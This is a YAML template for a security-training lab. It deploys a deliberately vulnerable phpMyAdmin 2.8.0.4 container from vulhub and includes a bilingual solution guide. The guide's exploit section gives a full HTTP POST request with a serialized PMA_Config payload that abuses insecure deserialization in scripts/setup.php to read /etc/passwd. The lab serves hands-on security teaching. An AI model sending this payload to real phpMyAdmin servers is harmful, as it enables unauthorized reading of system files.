apiVersion: hivora/v1
kind: Template
metadata:
  slug: vulhub-phpmyadmin-wooyun-2016-199433
  name: phpMyAdmin
  version: 1.1.0
  category: security-lab
  tags:
  - vulhub
  - phpmyadmin
  description: phpmyadmin scripts/setup.php Deserialization (vulhub).
  links:
    site: https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
  maintainer: vulhub
  license: MIT (vulhub)
  source: https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
  lab:
    phase: exploitation
    cves: []
    os:
    - linux
    tech:
    - deserialization
    - rce
    summary:
      fr: Désérialisation non sûre → exécution de code
      en: Insecure deserialization → code execution
    solution:
      fr: |
        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
        Affected version: 2.x
        # Setup
        Run the following command to start phpmyadmin:
        $ docker compose up -d
        Visit `http://your-ip:8080` and you will see the phpmyadmin home page. Because there is no connection to the database, we will get an error. But this vulnerability is not related to the database, so just ignore.
        # Exploit
        Send the following package to read `/etc/passwd`:
        $ POST /scripts/setup.php HTTP/1.1
        $ Host: your-ip:8080
        $ Accept-Encoding: gzip, deflate
        $ Accept: */*
        $ Accept-Language: en
        $ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        $ Connection: close
        $ Content-Type: application/x-www-form-urlencoded
        $ Content-Length: 80
        $ action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
      en: |
        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
        Affected version: 2.x
        # Setup
        Run the following command to start phpmyadmin:
        $ docker compose up -d
        Visit `http://your-ip:8080` and you will see the phpmyadmin home page. Because there is no connection to the database, we will get an error. But this vulnerability is not related to the database, so just ignore.
        # Exploit
        Send the following package to read `/etc/passwd`:
        $ POST /scripts/setup.php HTTP/1.1
        $ Host: your-ip:8080
        $ Accept-Encoding: gzip, deflate
        $ Accept: */*
        $ Accept-Language: en
        $ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        $ Connection: close
        $ Content-Type: application/x-www-form-urlencoded
        $ Content-Length: 80
        $ action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
requirements:
  arch:
  - amd64
form:
  basic:
  - id: port_80
    group:
      fr: Accès
      en: Access
    label: web 80/tcp
    type: port
    default: 8080
services:
  web:
    role: main
    image: vulhub/phpmyadmin
    tag: 2.8.0.4@sha256:57989d75b7a37387d5fe78becfb78b4bd26b8af5a63871a411aa486e32f5a979
    frozen: true
    ports:
    - container: 80
      host: '{{ form.port_80 }}'
      protocol: tcp
      purpose: web
      exposure: lan
update:
  strategy: manual
access:
  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
